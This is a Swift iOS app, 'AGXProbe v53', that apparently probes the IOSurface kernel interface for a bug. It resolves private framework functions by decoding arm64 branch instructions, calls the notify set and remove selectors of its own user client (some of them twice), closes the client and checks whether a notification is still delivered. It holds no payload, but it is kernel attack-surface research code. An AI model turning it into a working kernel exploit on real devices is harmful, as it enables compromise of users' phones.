import SwiftUI
import Darwin
import CoreFoundation

@main
struct AGXProbeApp: App {
    var body: some Scene { WindowGroup { ContentView() } }
}

struct ContentView: View {
    @StateObject private var vm = ReachViewModel()
    var body: some View {
        VStack(spacing: 12) {
            Text("AGXProbe v53 - runtime BL decode of notify callees").font(.headline)
            ScrollView {
                Text(vm.log)
                    .font(.system(size: 9, design: .monospaced))
                    .foregroundColor(.green)
                    .frame(maxWidth: .infinity, alignment: .leading)
                    .padding(6).background(Color.black.opacity(0.85)).cornerRadius(6)
            }
            Button(action: { Task { await vm.runProbe() } }) {
                Text(vm.isRunning ? "Probing..." : "Run v53")
                    .font(.headline).foregroundColor(.white)
                    .frame(maxWidth: .infinity).padding(10)
                    .background(vm.isRunning ? Color.gray : Color.blue).cornerRadius(8)
            }.disabled(vm.isRunning)
            Text("Status: \(vm.status)").font(.caption2).foregroundColor(.secondary)
            Spacer(minLength: 0)
        }
        .padding().task { await vm.autoRunIfRequested() }
    }
}

@MainActor
final class ReachViewModel: ObservableObject {
    @Published var log = ""
    @Published var status = "Ready"
    @Published var isRunning = false
    private var didAutoRun = false

    private let logFileURL: URL = {
        FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[0]
            .appendingPathComponent("reach.log")
    }()

    private func emit(_ m: String) {
        log += m + "\n"; print(m); fflush(stdout)
        try? log.write(to: logFileURL, atomically: true, encoding: .utf8)
    }

    func autoRunIfRequested() async {
        guard !didAutoRun else { return }
        didAutoRun = true
        if ProcessInfo.processInfo.arguments.contains("--autorun") { await runProbe() }
    }

    // MARK: - types

    typealias CreateFn = @convention(c) (CFDictionary) -> UnsafeMutableRawPointer?
    typealias GetIDFn = @convention(c) (UnsafeMutableRawPointer) -> UInt32
    typealias SetNotifyFn = @convention(c) (mach_port_t, UInt64, UInt64) -> kern_return_t

    typealias PortCallFn = @convention(c) (
        io_connect_t, UInt32, mach_port_t,
        UnsafePointer<UInt64>?, UInt32,
        UnsafeRawPointer?, Int,
        UnsafeMutablePointer<UInt64>?, UInt32,
        UnsafeRawPointer?, UnsafeMutablePointer<Int>?
    ) -> kern_return_t

    typealias PlainCallFn = @convention(c) (
        io_connect_t, UInt32,
        UnsafePointer<UInt64>?, UInt32,
        UnsafeRawPointer?, Int,
        UnsafeMutablePointer<UInt64>?, UnsafeMutablePointer<UInt32>?,
        UnsafeMutableRawPointer?, UnsafeMutablePointer<Int>?
    ) -> kern_return_t

    private var gCreate: CreateFn?
    private var gGetID: GetIDFn?
    private var gSet: SetNotifyFn?
    private var gPort: mach_port_t = 0

    private func loadSymbols() -> Bool {
        guard let handle = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_LAZY) else {
            emit("[NO] dlopen failed"); return false
        }
        defer { dlclose(handle) }
        guard let cs = dlsym(handle, "IOSurfaceCreate"),
              let isym = dlsym(handle, "IOSurfaceGetID"),
              let ss = dlsym(handle, "IOSurfaceClientSetSurfaceNotify"),
              let rs = dlsym(handle, "IOSurfaceClientRemoveSurfaceNotify") else {
            emit("[NO] symbol missing"); return false
        }
        gCreate = unsafeBitCast(cs, to: CreateFn.self)
        gGetID = unsafeBitCast(isym, to: GetIDFn.self)
        gSet = unsafeBitCast(ss, to: SetNotifyFn.self)
        emit("  setNotify fn  @ \(UInt(bitPattern: ss))")
        emit("  removeNotify  @ \(UInt(bitPattern: rs))")
        return true
    }

    private func makeSurface() -> UnsafeMutableRawPointer? {
        guard let gCreate else { return nil }
        let propsAny: [String: Any] = ["IOSurfaceWidth": 256, "IOSurfaceHeight": 256,
                                       "IOSurfaceBytesPerElement": 4]
        return gCreate(propsAny as CFDictionary)
    }

    private func krstr(_ kr: kern_return_t) -> String {
        let u = UInt32(bitPattern: kr)
        switch u {
        case 0: return "0x0 SUCCESS"
        case 0xe00002c2: return "0xe00002c2 BadArgument"
        case 0xe00002c9: return "0xe00002c9 InternalError/dup"
        case 0xe00002bd: return "0xe00002bd"
        case 0xe00002d8: return "0xe00002d8 NotAttached"
        default: return "0x\(String(u, radix: 16))"
        }
    }

    private func tryOpen(_ name: String, _ type: UInt32) -> (kern_return_t, io_connect_t) {
        let matching = IOServiceMatching(name)
        var iter: io_iterator_t = 0
        let kr1 = IOServiceGetMatchingServices(kIOMainPortDefault, matching, &iter)
        if kr1 != KERN_SUCCESS { return (kr1, 0) }
        let svc = IOIteratorNext(iter)
        IOObjectRelease(iter)
        if svc == 0 { return (-2, 0) }
        var conn: io_connect_t = 0
        let kr2 = IOServiceOpen(svc, mach_task_self_, type, &conn)
        IOObjectRelease(svc)
        return (kr2, conn)
    }

    /// Decode the arm64 BL at fn+off and return the absolute branch target.
    private func blTarget(_ fn: UnsafeMutableRawPointer, _ off: Int) -> UInt64? {
        let addr = UInt64(UInt(bitPattern: fn)) + UInt64(off)
        guard let p = UnsafeRawPointer(bitPattern: Int(addr)) else { return nil }
        let insn = p.load(as: UInt32.self)
        let op = insn >> 26
        guard op == 0b100101 || op == 0b000101 else { return nil }
        let imm26 = Int64(insn & 0x03FFFFFF)
        let signed = (imm26 << 38) >> 38
        return UInt64(bitPattern: Int64(addr) + 4 + (signed << 2))
    }

    // MARK: - probe

    private func probe() {
        emit("\n=== E0 decode runtime callees from BL instructions ===")
        guard let fwH = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_NOW),
              let fw = dlsym(fwH, "IOSurfaceClientSetSurfaceNotify"),
              let rm = dlsym(fwH, "IOSurfaceClientRemoveSurfaceNotify") else {
            emit("  sym fail"); return
        }
        guard let portTarget = blTarget(fw, 0x78) else { emit("  set BL decode failed"); return }
        guard let plainTarget = blTarget(rm, 0x50) else { emit("  remove BL decode failed"); return }
        emit("  set    BL@+0x78 -> \(portTarget)")
        emit("  remove BL@+0x50 -> \(plainTarget)")
        if let iocm = dlsym(nil, "IOConnectCallMethod") {
            let a = UInt(bitPattern: iocm)
            emit("  dlsym IOConnectCallMethod = \(a)  match=\(a == plainTarget)")
        }
        let portCall = unsafeBitCast(portTarget, to: PortCallFn.self)
        let plainCall = unsafeBitCast(plainTarget, to: PlainCallFn.self)

        guard let s = makeSurface() else { emit("[NO] create failed"); return }
        let sid = UInt64(gGetID!(s))
        emit("\n=== E1 surface ===")
        emit("  surface id 0x\(String(sid, radix: 16)) port 0x\(String(gPort, radix: 16))")
        emit("  framework set -> \(krstr(gSet!(gPort, 1, sid)))")

        let (okr, conn) = tryOpen("IOSurfaceRoot", 0)
        emit("\n=== E2 own user client ===")
        emit("  open -> \(krstr(okr)) conn=\(conn)")
        guard okr == KERN_SUCCESS else { return }

        var inScalars: [UInt64] = [0, 1, sid]
        var outScalars: [UInt64] = [1, sid, 0]

        // variant A: output count 0 (safe under either ABI)
        var kr: kern_return_t = -1
        inScalars.withUnsafeMutableBufferPointer { ib in
            outScalars.withUnsafeMutableBufferPointer { ob in
                kr = portCall(conn, 0x11, gPort,
                              UnsafeRawPointer(ib.baseAddress!).assumingMemoryBound(to: UInt64.self), 3,
                              nil, 0,
                              ob.baseAddress, 0,
                              nil, nil)
            }
        }
        emit("  portCall A (outCnt=0)   -> \(krstr(kr))")

        // variant B: output count 0x18 like the framework
        kr = -1
        inScalars.withUnsafeMutableBufferPointer { ib in
            outScalars.withUnsafeMutableBufferPointer { ob in
                kr = portCall(conn, 0x11, gPort,
                              UnsafeRawPointer(ib.baseAddress!).assumingMemoryBound(to: UInt64.self), 3,
                              nil, 0,
                              ob.baseAddress, 0x18,
                              nil, nil)
            }
        }
        emit("  portCall B (outCnt=0x18) -> \(krstr(kr))")

        // duplicate check
        kr = -1
        inScalars.withUnsafeMutableBufferPointer { ib in
            outScalars.withUnsafeMutableBufferPointer { ob in
                kr = portCall(conn, 0x11, gPort,
                              UnsafeRawPointer(ib.baseAddress!).assumingMemoryBound(to: UInt64.self), 3,
                              nil, 0,
                              ob.baseAddress, 0x18,
                              nil, nil)
            }
        }
        emit("  portCall B again          -> \(krstr(kr))")

        // plain remove with framework struct {0,id,0}
        var rmStruct: [UInt64] = [0, sid, 0]
        kr = -1
        rmStruct.withUnsafeMutableBufferPointer { sb in
            kr = plainCall(conn, 0x12, nil, 0,
                           UnsafeRawPointer(sb.baseAddress!), 0x18,
                           nil, nil, nil, nil)
        }
        emit("  plainCall remove          -> \(krstr(kr))")

        kr = -1
        rmStruct.withUnsafeMutableBufferPointer { sb in
            kr = plainCall(conn, 0x12, nil, 0,
                           UnsafeRawPointer(sb.baseAddress!), 0x18,
                           nil, nil, nil, nil)
        }
        emit("  plainCall remove again    -> \(krstr(kr))")

        emit("\n=== E3 close our user client and walk the surface ===")
        IOServiceClose(conn)
        emit("  closed")
        sleep(1)
        triggerWalk(s)
        drainPort()
        emit("\n=== done ===")
        Unmanaged<AnyObject>.fromOpaque(s).release()
    }

    private func triggerWalk(_ s: UnsafeMutableRawPointer) {
        guard let h = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_NOW) else { return }
        typealias SetValueFn = @convention(c) (UnsafeMutableRawPointer, CFString, CFTypeRef) -> kern_return_t
        guard let sv = dlsym(h, "IOSurfaceSetValue") else { emit("  no IOSurfaceSetValue"); return }
        let setValue = unsafeBitCast(sv, to: SetValueFn.self)
        let key = CFStringCreateWithCString(nil, "AGXProbeKey", CFStringBuiltInEncodings.UTF8.rawValue)
        let val = CFStringCreateWithCString(nil, "AGXProbeVal", CFStringBuiltInEncodings.UTF8.rawValue)
        let kr = setValue(s, key!, val!)
        emit("  IOSurfaceSetValue -> \(krstr(kr))")
    }

    private func drainPort() {
        var m = mach_msg_header_t()
        let mkr = mach_msg(&m, MACH_RCV_TIMEOUT, 0, gPort, UInt32(300), mach_port_t(0), 0)
        emit("  mach_msg recv -> \(krstr(mkr)) msglen=\(m.msgh_size) msgid=\(m.msgh_id)")
        if mkr == 0 { emit("  *** NOTIFICATION DELIVERED ***") }
    }

    func runProbe() async {
        isRunning = true; status = "Probing..."; log = ""
        try? "".write(to: logFileURL, atomically: true, encoding: .utf8)
        emit("=== AGXProbe v53 - runtime BL decode ===")
        guard loadSymbols() else { emit("=== failed ==="); status = "Failed"; isRunning = false; return }
        let pkr = mach_port_allocate(mach_task_self_, MACH_PORT_RIGHT_RECEIVE, &gPort)
        emit("  notify port 0x\(String(gPort, radix: 16)) kr=0x\(String(UInt32(bitPattern: pkr), radix: 16))")
        if pkr != KERN_SUCCESS { emit("=== failed ==="); status = "Failed"; isRunning = false; return }
        probe()
        status = "Complete"; isRunning = false
    }
}
